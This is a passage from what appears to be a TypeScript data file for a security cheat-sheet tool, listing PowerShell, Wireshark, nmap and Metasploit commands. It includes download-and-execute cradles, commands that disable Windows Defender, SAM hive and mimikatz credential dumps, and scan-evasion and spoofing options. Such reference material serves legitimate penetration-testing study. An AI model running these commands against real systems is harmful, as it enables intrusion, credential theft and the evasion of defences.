  { command: "[Security.Principal.WindowsIdentity]::GetCurrent().Groups | ForEach-Object { $_.Translate([Security.Principal.NTAccount]) }", description: "List current token groups", category: "Privilege & Security", difficulty: "advanced" },
  
  // Execution & Bypass
  { command: "Set-ExecutionPolicy Bypass -Scope Process", description: "Bypass execution policy for session", category: "Execution & Bypass", difficulty: "intermediate", tags: ["bypass"] },
  { command: "powershell -ep bypass -file script.ps1", description: "Run script bypassing execution policy", category: "Execution & Bypass", difficulty: "intermediate", tags: ["bypass"] },
  { command: "powershell -ExecutionPolicy Bypass -NoProfile -NonInteractive -File script.ps1", description: "Stealth script execution", category: "Execution & Bypass", difficulty: "intermediate", tags: ["bypass"] },
  { command: "IEX (New-Object Net.WebClient).DownloadString('<url>')", description: "Download and execute script in memory", category: "Execution & Bypass", difficulty: "advanced", dangerous: true, tags: ["bypass"] },
  { command: "IEX (iwr '<url>' -UseBasicParsing).Content", description: "Alternative download cradle", category: "Execution & Bypass", difficulty: "advanced", dangerous: true },
  { command: "[System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('<base64>'))", description: "Decode Base64 string", category: "Execution & Bypass", difficulty: "intermediate" },
  { command: "[Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes('<text>'))", description: "Encode to Base64", category: "Execution & Bypass", difficulty: "intermediate" },
  { command: "powershell -encodedCommand <base64>", description: "Execute Base64 encoded command", category: "Execution & Bypass", difficulty: "intermediate", tags: ["bypass"] },
  { command: "Get-MpPreference", description: "Windows Defender settings", category: "Execution & Bypass", difficulty: "intermediate" },
  { command: "Get-MpThreatDetection", description: "Recent Defender detections", category: "Execution & Bypass", difficulty: "intermediate", tags: ["forensics"] },
  { command: "Set-MpPreference -DisableRealtimeMonitoring $true", description: "Disable Defender realtime (requires admin)", category: "Execution & Bypass", difficulty: "advanced", dangerous: true },
  { command: "Add-MpPreference -ExclusionPath 'C:\\temp'", description: "Add Defender exclusion (requires admin)", category: "Execution & Bypass", difficulty: "advanced", dangerous: true },
  
  // Credential Harvesting
  { command: "reg save HKLM\\SAM sam.save", description: "Dump SAM hive (requires admin)", category: "Credential Harvesting", difficulty: "advanced", dangerous: true, tags: ["credentials"] },
  { command: "reg save HKLM\\SYSTEM system.save", description: "Dump SYSTEM hive (for SAM decryption)", category: "Credential Harvesting", difficulty: "advanced", dangerous: true, tags: ["credentials"] },
  { command: "mimikatz.exe 'sekurlsa::logonpasswords' exit", description: "Dump credentials with mimikatz", category: "Credential Harvesting", difficulty: "advanced", dangerous: true, tags: ["credentials"] },
  { command: "mimikatz.exe 'lsadump::sam' exit", description: "Dump SAM database with mimikatz", category: "Credential Harvesting", difficulty: "advanced", dangerous: true, tags: ["credentials"] },
  { command: "[Runtime.InteropServices.Marshal]::PtrToStringAuto([Runtime.InteropServices.Marshal]::SecureStringToBSTR($cred.Password))", description: "Extract password from PSCredential", category: "Credential Harvesting", difficulty: "advanced", tags: ["credentials"] },
  { command: "(Get-Credential).GetNetworkCredential() | Format-List", description: "Prompt for creds and display", category: "Credential Harvesting", difficulty: "intermediate", tags: ["credentials"] },
];

const wiresharkFilters: Command[] = [
  // Protocol Filters
  { command: "http", description: "Show only HTTP traffic", category: "Protocol Filters", difficulty: "beginner" },
  { command: "http2", description: "Show HTTP/2 traffic", category: "Protocol Filters", difficulty: "beginner" },
  { command: "dns", description: "Show only DNS traffic", category: "Protocol Filters", difficulty: "beginner" },
  { command: "tcp", description: "Show only TCP traffic", category: "Protocol Filters", difficulty: "beginner" },
  { command: "udp", description: "Show only UDP traffic", category: "Protocol Filters", difficulty: "beginner" },
  { command: "icmp", description: "Show only ICMP (ping) traffic", category: "Protocol Filters", difficulty: "beginner" },
  { command: "tls", description: "Show only TLS/SSL traffic", category: "Protocol Filters", difficulty: "beginner" },
  { command: "ssh", description: "Show only SSH traffic", category: "Protocol Filters", difficulty: "beginner" },
  { command: "ftp", description: "Show only FTP traffic", category: "Protocol Filters", difficulty: "beginner" },
  { command: "ftp-data", description: "Show FTP data transfers", category: "Protocol Filters", difficulty: "beginner" },
  { command: "smb || smb2", description: "Show SMB traffic (both versions)", category: "Protocol Filters", difficulty: "beginner" },
  { command: "rdp", description: "Show Remote Desktop traffic", category: "Protocol Filters", difficulty: "beginner" },
  { command: "kerberos", description: "Show Kerberos authentication traffic", category: "Protocol Filters", difficulty: "intermediate", tags: ["auth"] },
  { command: "ldap", description: "Show LDAP traffic", category: "Protocol Filters", difficulty: "beginner" },
  { command: "ntlmssp", description: "Show NTLM authentication", category: "Protocol Filters", difficulty: "intermediate", tags: ["auth"] },
  { command: "dhcp", description: "Show DHCP traffic", category: "Protocol Filters", difficulty: "beginner" },
  { command: "arp", description: "Show ARP traffic", category: "Protocol Filters", difficulty: "beginner" },
  { command: "sip", description: "Show SIP (VoIP) traffic", category: "Protocol Filters", difficulty: "intermediate" },
  { command: "mysql", description: "Show MySQL traffic", category: "Protocol Filters", difficulty: "intermediate" },
  
  // IP & Port Filters
  { command: "ip.addr == 192.168.1.1", description: "Traffic to/from specific IP", category: "IP & Port Filters", difficulty: "beginner" },
  { command: "ip.src == 192.168.1.1", description: "Traffic from specific source IP", category: "IP & Port Filters", difficulty: "beginner" },
  { command: "ip.dst == 192.168.1.1", description: "Traffic to specific destination IP", category: "IP & Port Filters", difficulty: "beginner" },
  { command: "ip.addr == 192.168.1.0/24", description: "Traffic to/from subnet", category: "IP & Port Filters", difficulty: "beginner" },
  { command: "!(ip.addr == 192.168.1.1)", description: "Exclude specific IP", category: "IP & Port Filters", difficulty: "beginner" },
  { command: "ip.addr in {192.168.1.1 192.168.1.2 192.168.1.3}", description: "Multiple IPs (any of these)", category: "IP & Port Filters", difficulty: "intermediate" },
  { command: "tcp.port == 443", description: "Traffic on specific port", category: "IP & Port Filters", difficulty: "beginner" },
  { command: "tcp.dstport == 80", description: "Traffic to destination port 80", category: "IP & Port Filters", difficulty: "beginner" },
  { command: "tcp.srcport == 4444", description: "Traffic from source port 4444", category: "IP & Port Filters", difficulty: "intermediate", tags: ["shells"] },
  { command: "tcp.port in {80 443 8080 8443}", description: "Traffic on multiple ports", category: "IP & Port Filters", difficulty: "beginner" },
  { command: "tcp.port >= 1024", description: "Traffic on high ports only", category: "IP & Port Filters", difficulty: "intermediate" },
  { command: "udp.port == 53", description: "DNS traffic (UDP)", category: "IP & Port Filters", difficulty: "beginner" },
  { command: "eth.addr == 00:11:22:33:44:55", description: "Traffic to/from MAC address", category: "IP & Port Filters", difficulty: "intermediate" },
  
  // HTTP Analysis
  { command: "http.request.method == \"GET\"", description: "HTTP GET requests only", category: "HTTP Analysis", difficulty: "beginner" },
  { command: "http.request.method == \"POST\"", description: "HTTP POST requests only", category: "HTTP Analysis", difficulty: "beginner" },
  { command: "http.request.method == \"PUT\"", description: "HTTP PUT requests only", category: "HTTP Analysis", difficulty: "beginner" },
  { command: "http.request.method == \"DELETE\"", description: "HTTP DELETE requests only", category: "HTTP Analysis", difficulty: "beginner" },
  { command: "http.response.code == 200", description: "HTTP 200 OK responses", category: "HTTP Analysis", difficulty: "beginner" },
  { command: "http.response.code >= 400", description: "HTTP error responses (4xx, 5xx)", category: "HTTP Analysis", difficulty: "beginner" },
  { command: "http.response.code == 401", description: "HTTP 401 Unauthorized", category: "HTTP Analysis", difficulty: "beginner", tags: ["auth"] },
  { command: "http.response.code == 403", description: "HTTP 403 Forbidden", category: "HTTP Analysis", difficulty: "beginner" },
  { command: "http.response.code == 500", description: "HTTP 500 Server Error", category: "HTTP Analysis", difficulty: "beginner" },
  { command: "http.host contains \"example\"", description: "HTTP requests to hosts containing 'example'", category: "HTTP Analysis", difficulty: "beginner" },
  { command: "http.host == \"api.example.com\"", description: "HTTP requests to specific host", category: "HTTP Analysis", difficulty: "beginner" },
  { command: "http.request.uri contains \"admin\"", description: "HTTP requests with 'admin' in URI", category: "HTTP Analysis", difficulty: "beginner", tags: ["recon"] },
  { command: "http.request.uri contains \"login\"", description: "HTTP requests to login pages", category: "HTTP Analysis", difficulty: "beginner", tags: ["auth"] },
  { command: "http.request.uri matches \"\\.(php|asp|jsp)\"", description: "Requests to dynamic pages (regex)", category: "HTTP Analysis", difficulty: "intermediate" },
  { command: "http.cookie", description: "HTTP packets with cookies", category: "HTTP Analysis", difficulty: "beginner", tags: ["auth"] },
  { command: "http.cookie contains \"session\"", description: "Packets with session cookies", category: "HTTP Analysis", difficulty: "intermediate", tags: ["auth"] },
  { command: "http.authbasic", description: "HTTP Basic authentication", category: "HTTP Analysis", difficulty: "intermediate", tags: ["credentials"] },
  { command: "http.authorization", description: "HTTP Authorization header present", category: "HTTP Analysis", difficulty: "intermediate", tags: ["auth"] },
  { command: "http.content_type contains \"json\"", description: "JSON content responses", category: "HTTP Analysis", difficulty: "beginner" },
  { command: "http.content_type contains \"xml\"", description: "XML content responses", category: "HTTP Analysis", difficulty: "beginner" },
  { command: "http.user_agent contains \"curl\"", description: "Requests from curl", category: "HTTP Analysis", difficulty: "intermediate" },
  { command: "http.file_data contains \"password\"", description: "HTTP body containing 'password'", category: "HTTP Analysis", difficulty: "intermediate", tags: ["credentials"] },
  
  // TLS/SSL Analysis
  { command: "tls.handshake", description: "TLS handshake packets", category: "TLS/SSL Analysis", difficulty: "intermediate" },
  { command: "tls.handshake.type == 1", description: "Client Hello packets", category: "TLS/SSL Analysis", difficulty: "intermediate" },
  { command: "tls.handshake.type == 2", description: "Server Hello packets", category: "TLS/SSL Analysis", difficulty: "intermediate" },
  { command: "tls.handshake.type == 11", description: "Certificate messages", category: "TLS/SSL Analysis", difficulty: "intermediate" },
  { command: "ssl.handshake.ciphersuite", description: "Show cipher suite negotiation", category: "TLS/SSL Analysis", difficulty: "intermediate" },
  { command: "tls.handshake.extensions_server_name", description: "Server Name Indication (SNI)", category: "TLS/SSL Analysis", difficulty: "intermediate" },
  { command: "tls.alert_message", description: "TLS alert messages (errors)", category: "TLS/SSL Analysis", difficulty: "intermediate" },
  { command: "x509sat.uTF8String", description: "Certificate subject info", category: "TLS/SSL Analysis", difficulty: "advanced" },
  
  // Security Analysis
  { command: "tcp.flags.syn == 1 && tcp.flags.ack == 0", description: "TCP SYN packets (scan detection)", category: "Security Analysis", difficulty: "intermediate", tags: ["scans"] },
  { command: "tcp.flags.rst == 1", description: "TCP RST packets (connection resets)", category: "Security Analysis", difficulty: "intermediate" },
  { command: "tcp.flags.fin == 1", description: "TCP FIN packets", category: "Security Analysis", difficulty: "intermediate" },
  { command: "tcp.flags == 0x029", description: "Xmas scan packets (FIN+PSH+URG)", category: "Security Analysis", difficulty: "advanced", tags: ["scans"] },
  { command: "tcp.flags == 0x000", description: "NULL scan packets (no flags)", category: "Security Analysis", difficulty: "advanced", tags: ["scans"] },
  { command: "icmp.type == 3", description: "ICMP destination unreachable", category: "Security Analysis", difficulty: "intermediate" },
  { command: "icmp.type == 8", description: "ICMP echo request (ping)", category: "Security Analysis", difficulty: "beginner" },
  { command: "icmp.type == 0", description: "ICMP echo reply", category: "Security Analysis", difficulty: "beginner" },
  { command: "dns.flags.response == 0", description: "DNS queries only", category: "Security Analysis", difficulty: "beginner" },
  { command: "dns.flags.response == 1", description: "DNS responses only", category: "Security Analysis", difficulty: "beginner" },
  { command: "dns.qry.name contains \"malware\"", description: "DNS queries for suspicious domains", category: "Security Analysis", difficulty: "intermediate", tags: ["malware"] },
  { command: "dns.qry.type == 16", description: "DNS TXT record queries (C2 indicator)", category: "Security Analysis", difficulty: "advanced", tags: ["c2"] },
  { command: "dns.qry.type == 28", description: "DNS AAAA (IPv6) queries", category: "Security Analysis", difficulty: "intermediate" },
  { command: "dns.qry.name matches \"[a-z0-9]{20,}\"", description: "Long random domain names (DGA)", category: "Security Analysis", difficulty: "advanced", tags: ["malware", "c2"] },
  { command: "frame contains \"password\"", description: "Frames containing 'password' string", category: "Security Analysis", difficulty: "beginner", tags: ["credentials"] },
  { command: "frame contains \"admin\"", description: "Frames containing 'admin'", category: "Security Analysis", difficulty: "beginner" },
  { command: "frame contains \"4D5A\"", description: "Frames containing MZ header (exe)", category: "Security Analysis", difficulty: "advanced", tags: ["malware"] },
  { command: "tcp.analysis.retransmission", description: "Retransmitted TCP packets", category: "Security Analysis", difficulty: "intermediate" },
  { command: "tcp.analysis.duplicate_ack", description: "Duplicate ACKs (possible issues)", category: "Security Analysis", difficulty: "intermediate" },
  { command: "tcp.analysis.lost_segment", description: "Lost TCP segments", category: "Security Analysis", difficulty: "intermediate" },
  { command: "tcp.analysis.zero_window", description: "Zero window (flow control)", category: "Security Analysis", difficulty: "advanced" },
  
  // SMB Analysis
  { command: "smb2.cmd == 5", description: "SMB2 Create (file access)", category: "SMB Analysis", difficulty: "intermediate", tags: ["forensics"] },
  { command: "smb2.cmd == 8", description: "SMB2 Read operations", category: "SMB Analysis", difficulty: "intermediate" },
  { command: "smb2.cmd == 9", description: "SMB2 Write operations", category: "SMB Analysis", difficulty: "intermediate" },
  { command: "smb.file contains \"password\"", description: "SMB file access with 'password'", category: "SMB Analysis", difficulty: "intermediate", tags: ["credentials"] },
  { command: "smb2.nt_status != 0", description: "SMB2 errors/failures", category: "SMB Analysis", difficulty: "intermediate" },
  { command: "dcerpc", description: "DCE/RPC traffic (AD operations)", category: "SMB Analysis", difficulty: "advanced" },
  
  // Compound Filters
  { command: "ip.addr == 192.168.1.1 && http", description: "HTTP traffic from/to specific IP", category: "Compound Filters", difficulty: "intermediate" },
  { command: "(http.request || http.response) && ip.addr == 192.168.1.1", description: "HTTP requests and responses for IP", category: "Compound Filters", difficulty: "intermediate" },
  { command: "!arp && !icmp && !dns", description: "Exclude ARP, ICMP, and DNS", category: "Compound Filters", difficulty: "beginner" },
  { command: "!(arp || dns || icmp || stp)", description: "Exclude common noisy protocols", category: "Compound Filters", difficulty: "intermediate" },
  { command: "tcp && !port 22", description: "TCP traffic excluding SSH", category: "Compound Filters", difficulty: "beginner" },
  { command: "http && (http.response.code == 401 || http.response.code == 403)", description: "HTTP auth failures", category: "Compound Filters", difficulty: "intermediate", tags: ["auth"] },
  { command: "http.request && !(http.host contains \"microsoft\" || http.host contains \"google\")", description: "HTTP excluding common hosts", category: "Compound Filters", difficulty: "intermediate" },
  { command: "(tcp.dstport == 4444 || tcp.srcport == 4444) && tcp.flags.push == 1", description: "Potential reverse shell traffic", category: "Compound Filters", difficulty: "advanced", tags: ["shells"] },
  { command: "ip.addr == 192.168.1.0/24 && !ip.addr == 192.168.1.1", description: "Subnet traffic excluding gateway", category: "Compound Filters", difficulty: "intermediate" },
  { command: "tcp.len > 0 && (tcp.port == 80 || tcp.port == 443)", description: "HTTP/HTTPS with payload", category: "Compound Filters", difficulty: "intermediate" },
  { command: "frame.time >= \"2024-01-01 00:00:00\" && frame.time <= \"2024-01-01 23:59:59\"", description: "Traffic within time range", category: "Compound Filters", difficulty: "intermediate", tags: ["forensics"] },
];

const nmapCommands: Command[] = [
  // Host Discovery
  { command: "nmap -sn 192.168.1.0/24", description: "Ping scan - discover hosts without port scanning", category: "Host Discovery", difficulty: "beginner", example: "nmap -sn 10.0.0.0/24" },
  { command: "nmap -Pn <target>", description: "Skip host discovery, treat all hosts as online", category: "Host Discovery", difficulty: "beginner" },
  { command: "nmap -PS22,80,443 <target>", description: "TCP SYN ping on specific ports", category: "Host Discovery", difficulty: "intermediate" },
  { command: "nmap -PA22,80,443 <target>", description: "TCP ACK ping on specific ports", category: "Host Discovery", difficulty: "intermediate" },
  { command: "nmap -PU53,161 <target>", description: "UDP ping on specific ports", category: "Host Discovery", difficulty: "intermediate" },
  { command: "nmap -PE <target>", description: "ICMP echo ping (traditional ping)", category: "Host Discovery", difficulty: "beginner" },
  { command: "nmap -PR 192.168.1.0/24", description: "ARP scan for local network (fastest)", category: "Host Discovery", difficulty: "beginner" },
  { command: "nmap -sL 192.168.1.0/24", description: "List targets without scanning (DNS resolution)", category: "Host Discovery", difficulty: "beginner" },
  { command: "nmap -iL targets.txt", description: "Scan targets from input file", category: "Host Discovery", difficulty: "beginner" },
  { command: "nmap --exclude 192.168.1.1", description: "Exclude specific host from scan", category: "Host Discovery", difficulty: "beginner" },
  
  // Port Scanning Techniques
  { command: "nmap -sS <target>", description: "TCP SYN scan (stealth scan, default)", category: "Port Scanning", difficulty: "intermediate", dangerous: true, example: "nmap -sS 192.168.1.1" },
  { command: "nmap -sT <target>", description: "TCP connect scan (full handshake)", category: "Port Scanning", difficulty: "beginner" },
  { command: "nmap -sU <target>", description: "UDP scan (slower, essential for DNS/DHCP/SNMP)", category: "Port Scanning", difficulty: "intermediate" },
  { command: "nmap -sA <target>", description: "TCP ACK scan (detect firewall rules)", category: "Port Scanning", difficulty: "advanced" },
  { command: "nmap -sW <target>", description: "TCP Window scan (like ACK but detects open ports)", category: "Port Scanning", difficulty: "advanced" },
  { command: "nmap -sN <target>", description: "TCP Null scan (no flags set)", category: "Port Scanning", difficulty: "advanced", dangerous: true },
  { command: "nmap -sF <target>", description: "TCP FIN scan (only FIN flag)", category: "Port Scanning", difficulty: "advanced", dangerous: true },
  { command: "nmap -sX <target>", description: "Xmas scan (FIN, PSH, URG flags)", category: "Port Scanning", difficulty: "advanced", dangerous: true },
  { command: "nmap -sM <target>", description: "Maimon scan (FIN/ACK flags)", category: "Port Scanning", difficulty: "advanced" },
  { command: "nmap -sI <zombie> <target>", description: "Idle scan using zombie host (very stealthy)", category: "Port Scanning", difficulty: "advanced", dangerous: true },
  { command: "nmap -sO <target>", description: "IP protocol scan (discover supported protocols)", category: "Port Scanning", difficulty: "advanced" },
  { command: "nmap -sY <target>", description: "SCTP INIT scan", category: "Port Scanning", difficulty: "advanced" },
  
  // Port Specification
  { command: "nmap -p 80 <target>", description: "Scan specific port", category: "Port Specification", difficulty: "beginner" },
  { command: "nmap -p 80,443,8080 <target>", description: "Scan multiple specific ports", category: "Port Specification", difficulty: "beginner" },
  { command: "nmap -p 1-1000 <target>", description: "Scan port range", category: "Port Specification", difficulty: "beginner" },
  { command: "nmap -p- <target>", description: "Scan all 65535 ports", category: "Port Specification", difficulty: "beginner", example: "nmap -p- 192.168.1.1" },
  { command: "nmap -p U:53,161,T:80,443 <target>", description: "Scan specific UDP and TCP ports", category: "Port Specification", difficulty: "intermediate" },
  { command: "nmap --top-ports 100 <target>", description: "Scan top 100 most common ports", category: "Port Specification", difficulty: "beginner" },
  { command: "nmap -F <target>", description: "Fast scan (top 100 ports)", category: "Port Specification", difficulty: "beginner" },
  { command: "nmap -r <target>", description: "Scan ports consecutively (not randomized)", category: "Port Specification", difficulty: "intermediate" },
  { command: "nmap --port-ratio 0.1 <target>", description: "Scan ports by frequency ratio", category: "Port Specification", difficulty: "advanced" },
  
  // Service & Version Detection
  { command: "nmap -sV <target>", description: "Detect service versions", category: "Service Detection", difficulty: "beginner", example: "nmap -sV 192.168.1.1" },
  { command: "nmap -sV --version-intensity 5 <target>", description: "Set version scan intensity (0-9)", category: "Service Detection", difficulty: "intermediate" },
  { command: "nmap -sV --version-light <target>", description: "Light version detection (faster)", category: "Service Detection", difficulty: "beginner" },
  { command: "nmap -sV --version-all <target>", description: "Try all probes for version detection", category: "Service Detection", difficulty: "intermediate" },
  { command: "nmap -A <target>", description: "Aggressive scan (OS, version, scripts, traceroute)", category: "Service Detection", difficulty: "beginner" },
  { command: "nmap -O <target>", description: "OS detection", category: "Service Detection", difficulty: "beginner" },
  { command: "nmap -O --osscan-guess <target>", description: "Aggressive OS guessing", category: "Service Detection", difficulty: "intermediate" },
  { command: "nmap --traceroute <target>", description: "Trace route to target host", category: "Service Detection", difficulty: "beginner" },
  
  // NSE Scripts
  { command: "nmap -sC <target>", description: "Run default scripts (same as --script=default)", category: "NSE Scripts", difficulty: "beginner", example: "nmap -sC 192.168.1.1" },
  { command: "nmap --script=vuln <target>", description: "Run vulnerability detection scripts", category: "NSE Scripts", difficulty: "intermediate", tags: ["vulns"] },
  { command: "nmap --script=safe <target>", description: "Run safe (non-intrusive) scripts", category: "NSE Scripts", difficulty: "beginner" },
  { command: "nmap --script=exploit <target>", description: "Run exploit scripts (use carefully)", category: "NSE Scripts", difficulty: "advanced", dangerous: true, tags: ["exploit"] },
  { command: "nmap --script=auth <target>", description: "Run authentication-related scripts", category: "NSE Scripts", difficulty: "intermediate", tags: ["auth"] },
  { command: "nmap --script=brute <target>", description: "Run brute-force scripts", category: "NSE Scripts", difficulty: "advanced", dangerous: true, tags: ["brute"] },
  { command: "nmap --script=discovery <target>", description: "Run discovery scripts", category: "NSE Scripts", difficulty: "intermediate", tags: ["recon"] },
  { command: "nmap --script=http-* <target>", description: "Run all HTTP-related scripts", category: "NSE Scripts", difficulty: "intermediate" },
  { command: "nmap --script=smb-vuln-* <target>", description: "Check for SMB vulnerabilities", category: "NSE Scripts", difficulty: "intermediate", tags: ["vulns"] },
  { command: "nmap --script=ssl-heartbleed <target>", description: "Check for Heartbleed vulnerability", category: "NSE Scripts", difficulty: "intermediate", tags: ["vulns"] },
  { command: "nmap --script=http-sql-injection <target>", description: "Test for SQL injection", category: "NSE Scripts", difficulty: "intermediate", dangerous: true, tags: ["vulns"] },
  { command: "nmap --script=http-enum <target>", description: "HTTP directory/file enumeration", category: "NSE Scripts", difficulty: "intermediate", tags: ["recon"] },
  { command: "nmap --script=dns-brute <target>", description: "DNS subdomain brute force", category: "NSE Scripts", difficulty: "intermediate", tags: ["recon"] },
  { command: "nmap --script=ftp-anon <target>", description: "Check for anonymous FTP login", category: "NSE Scripts", difficulty: "beginner", tags: ["auth"] },
  { command: "nmap --script=ssh-brute <target>", description: "SSH brute force attack", category: "NSE Scripts", difficulty: "advanced", dangerous: true, tags: ["brute"] },
  { command: "nmap --script=banner <target>", description: "Grab service banners", category: "NSE Scripts", difficulty: "beginner" },
  { command: "nmap --script-args <args>", description: "Pass arguments to scripts", category: "NSE Scripts", difficulty: "intermediate", example: "nmap --script=http-brute --script-args http-brute.path=/admin" },
  { command: "nmap --script-help=<script>", description: "Get help for specific script", category: "NSE Scripts", difficulty: "beginner" },
  { command: "nmap --script-updatedb", description: "Update NSE script database", category: "NSE Scripts", difficulty: "beginner" },
  
  // Timing & Performance
  { command: "nmap -T0 <target>", description: "Paranoid timing (IDS evasion, very slow)", category: "Timing & Performance", difficulty: "intermediate" },
  { command: "nmap -T1 <target>", description: "Sneaky timing (IDS evasion)", category: "Timing & Performance", difficulty: "intermediate" },
  { command: "nmap -T2 <target>", description: "Polite timing (less bandwidth)", category: "Timing & Performance", difficulty: "beginner" },
  { command: "nmap -T3 <target>", description: "Normal timing (default)", category: "Timing & Performance", difficulty: "beginner" },
  { command: "nmap -T4 <target>", description: "Aggressive timing (faster, reliable networks)", category: "Timing & Performance", difficulty: "beginner", example: "nmap -T4 192.168.1.1" },
  { command: "nmap -T5 <target>", description: "Insane timing (fastest, may miss ports)", category: "Timing & Performance", difficulty: "intermediate" },
  { command: "nmap --min-rate 1000 <target>", description: "Send at least 1000 packets/second", category: "Timing & Performance", difficulty: "intermediate" },
  { command: "nmap --max-rate 100 <target>", description: "Send no more than 100 packets/second", category: "Timing & Performance", difficulty: "intermediate" },
  { command: "nmap --host-timeout 30m <target>", description: "Give up on host after 30 minutes", category: "Timing & Performance", difficulty: "intermediate" },
  { command: "nmap --scan-delay 1s <target>", description: "Delay between probes", category: "Timing & Performance", difficulty: "intermediate" },
  { command: "nmap --max-retries 3 <target>", description: "Maximum retries per port", category: "Timing & Performance", difficulty: "intermediate" },
  
  // Output Formats
  { command: "nmap -oN output.txt <target>", description: "Normal output to file", category: "Output Formats", difficulty: "beginner" },
  { command: "nmap -oX output.xml <target>", description: "XML output (for tools/parsing)", category: "Output Formats", difficulty: "beginner" },
  { command: "nmap -oG output.gnmap <target>", description: "Grepable output", category: "Output Formats", difficulty: "beginner" },
  { command: "nmap -oA basename <target>", description: "Output in all formats (.nmap, .xml, .gnmap)", category: "Output Formats", difficulty: "beginner" },
  { command: "nmap -v <target>", description: "Increase verbosity", category: "Output Formats", difficulty: "beginner" },
  { command: "nmap -vv <target>", description: "Very verbose output", category: "Output Formats", difficulty: "beginner" },
  { command: "nmap -d <target>", description: "Debugging output", category: "Output Formats", difficulty: "advanced" },
  { command: "nmap --open <target>", description: "Only show open ports", category: "Output Formats", difficulty: "beginner" },
  { command: "nmap --packet-trace <target>", description: "Show all packets sent/received", category: "Output Formats", difficulty: "advanced" },
  { command: "nmap --reason <target>", description: "Display reason for port state", category: "Output Formats", difficulty: "beginner" },
  { command: "nmap --resume scan.gnmap", description: "Resume interrupted scan", category: "Output Formats", difficulty: "intermediate" },
  
  // Firewall/IDS Evasion
  { command: "nmap -f <target>", description: "Fragment packets (evade firewalls)", category: "Firewall Evasion", difficulty: "advanced", dangerous: true },
  { command: "nmap -ff <target>", description: "Fragment packets (16 bytes)", category: "Firewall Evasion", difficulty: "advanced", dangerous: true },
  { command: "nmap --mtu 24 <target>", description: "Set specific MTU size", category: "Firewall Evasion", difficulty: "advanced" },
  { command: "nmap -D RND:10 <target>", description: "Use 10 random decoy IPs", category: "Firewall Evasion", difficulty: "advanced", dangerous: true },
  { command: "nmap -D decoy1,decoy2,ME <target>", description: "Use specific decoys (ME = your IP)", category: "Firewall Evasion", difficulty: "advanced", dangerous: true },
  { command: "nmap -S <spoof_ip> <target>", description: "Spoof source IP (need to sniff responses)", category: "Firewall Evasion", difficulty: "advanced", dangerous: true },
  { command: "nmap -g 53 <target>", description: "Use source port 53 (DNS - often allowed)", category: "Firewall Evasion", difficulty: "intermediate" },
  { command: "nmap --source-port 80 <target>", description: "Use source port 80", category: "Firewall Evasion", difficulty: "intermediate" },
  { command: "nmap --data-length 25 <target>", description: "Append random data to packets", category: "Firewall Evasion", difficulty: "advanced" },
  { command: "nmap --randomize-hosts <targets>", description: "Randomize target scan order", category: "Firewall Evasion", difficulty: "intermediate" },
  { command: "nmap --spoof-mac 0 <target>", description: "Spoof MAC address (random)", category: "Firewall Evasion", difficulty: "advanced", dangerous: true },
  { command: "nmap --spoof-mac Apple <target>", description: "Spoof as Apple MAC", category: "Firewall Evasion", difficulty: "advanced", dangerous: true },
  { command: "nmap --badsum <target>", description: "Send packets with bad checksums", category: "Firewall Evasion", difficulty: "advanced" },
  { command: "nmap --ttl 64 <target>", description: "Set custom TTL value", category: "Firewall Evasion", difficulty: "advanced" },
  { command: "nmap --proxies socks4://proxy:port <target>", description: "Scan through SOCKS proxy", category: "Firewall Evasion", difficulty: "advanced" },
  
  // Common Combinations
  { command: "nmap -sS -sV -sC -O <target>", description: "Comprehensive scan (SYN, version, scripts, OS)", category: "Common Combinations", difficulty: "beginner", example: "nmap -sS -sV -sC -O 192.168.1.1" },
  { command: "nmap -sS -sU -p- <target>", description: "Full TCP and UDP port scan", category: "Common Combinations", difficulty: "intermediate" },
  { command: "nmap -sV -sC -p- -T4 <target>", description: "Full port scan with version/scripts (fast)", category: "Common Combinations", difficulty: "beginner" },
  { command: "nmap -Pn -sS -sV -p- --open <target>", description: "Stealth scan, all ports, open only", category: "Common Combinations", difficulty: "intermediate" },
  { command: "nmap -sn -PR 192.168.1.0/24 -oG - | grep Up", description: "Quick host discovery, list alive hosts", category: "Common Combinations", difficulty: "intermediate" },
  { command: "nmap -sV --script=vuln -p 80,443,8080 <target>", description: "Web server vulnerability scan", category: "Common Combinations", difficulty: "intermediate", tags: ["vulns"] },
  { command: "nmap -p 445 --script=smb-vuln* <target>", description: "SMB vulnerability scan (EternalBlue, etc.)", category: "Common Combinations", difficulty: "intermediate", tags: ["vulns"] },
  { command: "nmap -sU -p 161 --script=snmp-brute <target>", description: "SNMP enumeration", category: "Common Combinations", difficulty: "intermediate", tags: ["recon"] },
  { command: "nmap -sV -p 21 --script=ftp-* <target>", description: "FTP enumeration", category: "Common Combinations", difficulty: "intermediate", tags: ["recon"] },
  { command: "nmap -sV -p 22 --script=ssh-* <target>", description: "SSH enumeration", category: "Common Combinations", difficulty: "intermediate", tags: ["recon"] },
  { command: "nmap -Pn -sS -T1 -f --data-length 200 <target>", description: "IDS evasion scan", category: "Common Combinations", difficulty: "advanced", dangerous: true },
  { command: "nmap -A -T4 -v <target>", description: "Aggressive full scan (verbose)", category: "Common Combinations", difficulty: "beginner" },
];

// Metasploit Commands
const metasploitCommands: Command[] = [
  // Console Basics
  { command: "msfconsole", description: "Start Metasploit console", category: "Console Basics", difficulty: "beginner" },
  { command: "help", description: "Show all available commands", category: "Console Basics", difficulty: "beginner" },
  { command: "search <term>", description: "Search for modules", category: "Console Basics", difficulty: "beginner", example: "search eternalblue" },
  { command: "search type:exploit platform:windows", description: "Search with filters", category: "Console Basics", difficulty: "intermediate" },
  { command: "use <module>", description: "Select a module to use", category: "Console Basics", difficulty: "beginner", example: "use exploit/windows/smb/ms17_010_eternalblue" },
  { command: "info", description: "Show info about current module", category: "Console Basics", difficulty: "beginner" },
  { command: "show options", description: "Show module options", category: "Console Basics", difficulty: "beginner" },
  { command: "show payloads", description: "Show compatible payloads", category: "Console Basics", difficulty: "beginner" },
  { command: "show targets", description: "Show exploit targets", category: "Console Basics", difficulty: "intermediate" },
  { command: "show advanced", description: "Show advanced options", category: "Console Basics", difficulty: "intermediate" },
  { command: "back", description: "Exit current module", category: "Console Basics", difficulty: "beginner" },
  { command: "exit", description: "Exit msfconsole", category: "Console Basics", difficulty: "beginner" },
  
  // Configuration
  { command: "set RHOSTS <target>", description: "Set target host(s)", category: "Configuration", difficulty: "beginner", example: "set RHOSTS 192.168.1.100" },
  { command: "set RPORT <port>", description: "Set target port", category: "Configuration", difficulty: "beginner" },
  { command: "set LHOST <ip>", description: "Set listener IP (your IP)", category: "Configuration", difficulty: "beginner", example: "set LHOST 192.168.1.50" },
